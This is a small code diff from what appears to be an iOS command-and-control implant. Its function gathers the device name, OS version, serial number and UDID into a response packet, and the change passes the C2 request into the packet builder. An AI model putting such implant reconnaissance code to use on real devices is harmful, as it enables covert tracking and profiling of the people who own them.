@@ -67,7 +67,7 @@ static tlv_pkt_t *gather_get_info(c2_t *c2)
     char *serialString;
     char *udidString;
 
-    result = api_craft_tlv_pkt(API_CALL_SUCCESS);
+    result = api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);
 
     name = MGCopyAnswer(kMGUserAssignedDeviceName);
     software = MGCopyAnswer(kMGProductVersion);
